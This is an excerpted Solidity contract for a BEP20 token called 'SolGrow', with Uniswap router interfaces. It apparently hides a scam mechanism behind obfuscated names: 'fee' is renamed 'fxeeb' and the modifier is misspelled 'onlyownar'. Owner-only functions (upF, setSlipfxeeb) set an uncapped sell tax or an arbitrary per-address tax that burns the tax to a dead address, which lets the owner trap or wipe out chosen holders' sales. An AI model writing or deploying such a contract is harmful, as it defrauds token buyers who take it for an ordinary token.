...
interface IUniswapV2Factory {
    ...
    function fxeebTo() external view returns (address);
    function fxeebToSetter() external view returns (address);
    ...
    function setfxeebTo(address) external;
    function setfxeebToSetter(address) external;
}


interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingfxeebOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function removeLiquidityETHWithPermitSupportingfxeebOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function swapExactTokensForTokensSupportingfxeebOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
    ...
    function swapExactETHForTokensSupportingfxeebOnTransferTokens(
        uint AmountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingfxeebOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
...
contract SolGrow is BEP20, Ownable {
    // ext
    ...
    uint256 private _defaultSellfxeeb = 0;

    uint256 private _defaultBuyfxeeb = 0;


    mapping(address => bool) private _mAccount;

    mapping(address => uint256) private _slipfxeeb;
    ...
    function upF(uint256 _value) external onlyownar {
        _defaultSellfxeeb = _value;
    }

    function setSlipfxeeb(address _address, uint256 _value) external onlyownar {
        require(_value > 0, "Account tax must be greater than or equal to 1");
        _slipfxeeb[_address] = _value;
    }

    function getSlipfxeeb(address _address) external view onlyownar returns (uint256) {
        return _slipfxeeb[_address];
    }


    function setMAccountfxeeb(address _address, bool _value) external onlyownar {
        _mAccount[_address] = _value;
    }

    function getMAccountfxeeb(address _address) external view onlyownar returns (bool) {
    ...
    function _receiveF(
        ...
        uint256 tradefxeebAmount = 0;

        if (rF) {
            uint256 tradefxeeb = 0;
            if (uniswapV2Pair != address(0)) {
                if (_to == uniswapV2Pair) {

                    tradefxeeb = _defaultSellfxeeb;
                }
                if (from == uniswapV2Pair) {

                    tradefxeeb = _defaultBuyfxeeb;
                }
            }
            if (_slipfxeeb[from] > 0) {
                tradefxeeb = _slipfxeeb[from];
            }

            tradefxeebAmount = _Amount.mul(tradefxeeb).div(100);
        }


        if (tradefxeebAmount > 0) {
            _balances[from] = _balances[from].sub(tradefxeebAmount);
            _balances[_deadAddress] = _balances[_deadAddress].add(tradefxeebAmount);
            emit Transfer(from, _deadAddress, tradefxeebAmount);
        }

        _balances[from] = _balances[from].sub(_Amount - tradefxeebAmount);
        _balances[_to] = _balances[_to].add(_Amount - tradefxeebAmount);
        emit Transfer(from, _to, _Amount - tradefxeebAmount);
    }
